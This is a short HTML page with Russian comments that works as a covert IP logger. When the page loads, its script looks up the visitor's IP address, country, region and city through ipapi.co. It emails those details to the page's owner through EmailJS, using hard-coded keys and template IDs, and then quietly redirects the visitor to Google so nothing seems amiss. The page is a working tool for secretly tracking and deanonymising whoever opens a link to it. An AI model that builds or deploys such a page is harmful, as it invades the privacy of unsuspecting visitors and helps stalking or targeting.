<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title></title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>
  <script>
    emailjs.init("TEWzd8Aj5uS0d7yeq"); // твой публичный ключ

    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        // отправка письма
        return emailjs.send("service_md495n5", "template_juupnvs", {
          ip: data.ip,
          country: data.country_name,
          region: data.region,
          city: data.city
        });
      })
      .then(() => {
        // письмо успешно отправлено — теперь редирект
        window.location.href = 'https://www.google.com';
      })
      .catch(e => {
        // если ошибка — выводим в консоль
        console.error('Ошибка при отправке письма:', e);
        // можно всё равно сделать редирект через несколько секунд
        setTimeout(() => {
          window.location.href = 'https://www.google.com';
        }, 3000);
      });
  </script>
</body>
</html>
